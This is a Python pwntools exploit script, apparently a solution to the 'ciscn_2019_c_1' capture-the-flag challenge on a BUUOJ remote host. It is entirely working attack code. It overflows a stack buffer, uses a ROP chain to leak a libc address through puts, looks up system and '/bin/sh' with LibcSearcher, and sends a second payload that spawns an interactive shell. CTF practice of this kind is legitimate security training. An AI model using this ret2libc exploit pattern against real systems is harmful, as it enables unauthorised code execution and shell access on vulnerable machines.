from pwn import *
from LibcSearcher import *

context(os="linux",arch="amd64")

elf = ELF("./ciscn_2019_c_1")
#io  = remote("192.168.95.131",10001)
io  = remote("node4.buuoj.cn",25014)

#pause()

_lib_main_got_addr      =   elf.got["__libc_start_main"]
main_addr               =   elf.symbols["main"]
puts_plt_addr           =   elf.plt["puts"]
pop_rdi_ret             =   0x400c83

def encrypt(temp_s):
    s = ord(temp_s)
    if ( s <= 96 or s > 122 ):
        if ( s <= 64 or s > 90 ):
            if ( s > 47 and s <= 57 ):
                s ^= 15
        else:
            s ^= 14
    else:
        s ^= 13
    return chr(s)

def function_one():
    payload=flat(b"A"*88,pop_rdi_ret,_lib_main_got_addr,puts_plt_addr,main_addr)
    result_str = ""
    for i in payload:
        result_str += encrypt(chr(i))
    print("result_str = ", result_str)
    io.recvuntil(b"Input your choice!")
    io.sendline(b"1")
    #pause()
    print(io.recvuntil(b"Input your Plaintext to be encrypted"))
    io.sendline(payload)
    one  = io.recvuntil(b"\n")
    one  = io.recvuntil(b"\n")
    one  = io.recvuntil(b"\n")
    one  = io.recvuntil(b"\n")[:-1]
    one  = one.ljust(8,b"\0")
    real_libc_start_main_addr  = u64(one)
    print(hex(real_libc_start_main_addr))
    libc = LibcSearcher("__libc_start_main",real_libc_start_main_addr)
    print("__libc_start_main offset = ", hex(libc.dump("__libc_start_main")))
    libc_base_addr = real_libc_start_main_addr - libc.dump("__libc_start_main")
    print("libc_base addr = ",hex(libc_base_addr))
    real_system_addr = libc_base_addr + libc.dump("system")
    real_binsh_addr  = libc_base_addr + libc.dump("str_bin_sh")
    print("read_system_addr = ",hex(real_system_addr))
    print("real_bin_sh_addr = ",hex(real_binsh_addr))
    print(b"+++++++++++++++++++++++++++++++++++++++++++++++++++")
    #pause()
    function_tow(real_system_addr,real_binsh_addr)

def function_tow(real_system_addr, real_bin_sh_addr):
    new_one = io.recvuntil(b"Input your choice!")
    print(new_one)
    io.sendline(b"1")
    print(io.recvuntil(b"Input your Plaintext to be encrypted"))
    payload=flat(b"A"*88,0x4006B9,pop_rdi_ret,real_bin_sh_addr,real_system_addr)
    io.sendline(payload)
    io.recv()
    io.interactive()
    #pause()

if __name__ == "__main__":
    function_one()